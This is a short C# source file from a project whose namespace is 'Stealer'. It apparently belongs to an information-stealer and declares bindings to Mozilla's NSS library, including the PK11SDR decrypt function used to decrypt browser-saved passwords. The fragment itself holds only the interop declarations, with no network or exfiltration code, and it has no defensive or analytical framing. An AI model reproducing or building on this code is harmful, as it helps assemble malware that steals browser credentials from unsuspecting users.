using System;
using System.Runtime.InteropServices;

namespace Stealer;

internal sealed class Nss3
{
	public struct TSECItem
	{
		public int SECItemType;

		public IntPtr SECItemData;

		public int SECItemLen;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long NssInit(string sDirectory);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long NssShutdown();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Pk11SdrDecrypt(ref TSECItem tsData, ref TSECItem tsResult, int iContent);
}
